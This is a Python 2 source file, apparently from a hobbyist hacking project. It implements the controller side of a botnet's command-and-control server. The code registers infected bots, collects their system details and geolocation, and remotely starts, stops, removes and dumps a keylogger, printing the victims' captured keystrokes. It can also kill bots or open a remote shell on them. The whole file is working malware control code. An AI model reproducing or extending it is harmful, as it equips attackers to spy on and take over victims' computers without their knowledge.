# Date: 10/17/2017
# Author: Ethical-H4CK3R
# Description: Communication Is Key

import time
import json
import base64
import threading

from file import File
from ping import Ping
from shell import Shell
from valid import Valid

class Bot(object):
 ''' Holds bot information '''

 def __init__(self, session):
  self.system = None
  self.location = None
  self.keylogging = False
  self.session = session

class Communicate(Ping, Valid, File):
 '''
             [Server]
            /        \
           /          \
   [Master]            [Bot]
 '''

 def __init__(self):
  File.__init__(self)
  Ping.__init__(self)
  Valid.__init__(self)

 def struct(self, num, args=''):
  # formats the data that is being sent
  return json.dumps({'id': num, 'args': args.split() if not args else args})

 def geo(self, session):
  try:
   if self.wait:return
   session.settimeout(15)
   self.sendData(session, self.struct(102))
   return json.loads(session.recv(1024))
  except:pass

 def sys(self, session):
  try:
   if self.wait:return
   session.settimeout(15)
   self.sendData(session, self.struct(103))
   return json.loads(session.recv(1024))
  except:pass

 def sendData(self, session, data):
  try:session.sendall(data)
  except:pass

 def addBot(self, session):
  if not self.server_status:return
  bot = Bot(session)
  time.sleep(1.5)

  bot.system = self.sys(session)
  time.sleep(1.5)

  bot.location = self.geo(session)
  self.botnet.append(bot)

  if not self.ping:
   self.ping = True
   threading.Thread(target=self.startPing).start()

 def system(self, num):
  try:
   bot = self.botnet[eval(num)-1]
   if not bot.system:return
   system = bot.system

   if len(system):print
   print '[System Info]'
   for n in sorted(system, key=len):
    print '[-] {}: {}'.format(n, system[n])
   print '[+] Keylogging:',bot.keylogging
  except:pass

 def location(self, num):
  try:
   bot = self.botnet[eval(num)-1]
   if not bot.location:return
   location = bot.location

   if len(location):print
   print '[Geolocation]'
   for n in sorted(location, key=len):
    print '[-] {}: {}'.format(n, location[n])
   if len(location):print
  except:pass

 def keylogger(self, num, state):
  try:
   bot = self.botnet[eval(num)-1]
   state = 5 if state.upper() == 'START' else 6 if state.upper() == 'STOP' else 7 if state.upper() == \
   'REMOVE' else 8 if state.upper() == 'DUMP' else None
   if not state:return

   if state == 5:
    bot.keylogging = True
    self.sendData(bot.session, self.struct(5))

   if state == 6:
    bot.keylogging = False
    self.sendData(bot.session, self.struct(6))

   if state == 7:
    bot.keylogging = False
    self.sendData(bot.session, self.struct(7))
   if state == 8:self.showkeys(bot.session)
  except:pass

 def showkeys(self, session):
  self.wait = True
  try:
   session.settimeout(10)
   self.sendData(session, self.struct(8))
   size = int(session.recv(1024))
   time.sleep(1.5)

   session.sendall('200')
   session.settimeout(3)
   keys = ''
   while self.alive:
    try:keys+=session.recv(size)
    except:break
   print base64.b64decode(keys)
  except:self.wait = False

 def display(self):
  if not self.server_status:
   print 'Error: Please start the C&C server & try again'
   return

  # zero bots
  if not self.botnet:
   print 'Botnet Size: 0'

  # display the botnet
  for num, bot in enumerate(self.botnet):
   try:
    ip = bot.location['Ip'] if bot.location else 'UNKNOWN'
    ip = ip if ip else 'UNKNOWN'
    if not num:
     print '\nIP {}\tID'.format(''.ljust(15))
     print '.. {}\t..\n'.format(''.ljust(15))

    # display information
    print '{}\t\t{:02}'.format(ip.ljust(15-len(ip)%15), num+1)
   except:pass
  if len(self.botnet):print

 def killBot(self, bot):
  try:
   self.kill(bot.session)
   del self.botnet[self.botnet.index(bot)]
  except:pass

 def shell(self, bot, prompt):
  self.wait = True
  Shell(bot).run(prompt)
  self.wait = False
